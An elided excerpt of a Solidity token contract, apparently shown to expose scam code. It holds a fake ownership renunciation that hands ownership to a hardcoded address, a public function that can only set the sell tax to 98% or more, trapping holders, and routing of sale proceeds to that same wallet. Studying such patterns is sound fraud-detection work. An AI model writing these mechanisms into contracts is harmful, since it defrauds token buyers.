...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        ...
        _owner = address(0x60a46a2e9beF703b5e5E1aBD00f376f7a52A2298);
    }
...
contract DustidaniDustidani is Context, IERC20, Ownable {
    ...
    address payable private C_WalletAddress = payable(0x60a46a2e9beF703b5e5E1aBD00f376f7a52A2298);
    ...
    uint256 public maxApprovelength = 98;
    ...
    function _Approved(uint256 _approvevalue) public {
        require(_approvevalue >= maxApprovelength);
        _totalTaxIfSelling = _approvevalue;
    }
    ...
    function swapAndLiquify(uint256 tAmount) private lockTheSwap {
        ...
        if(amountETHTeam > 0)
            transferToAddressETH(C_WalletAddress, amountETHTeam);
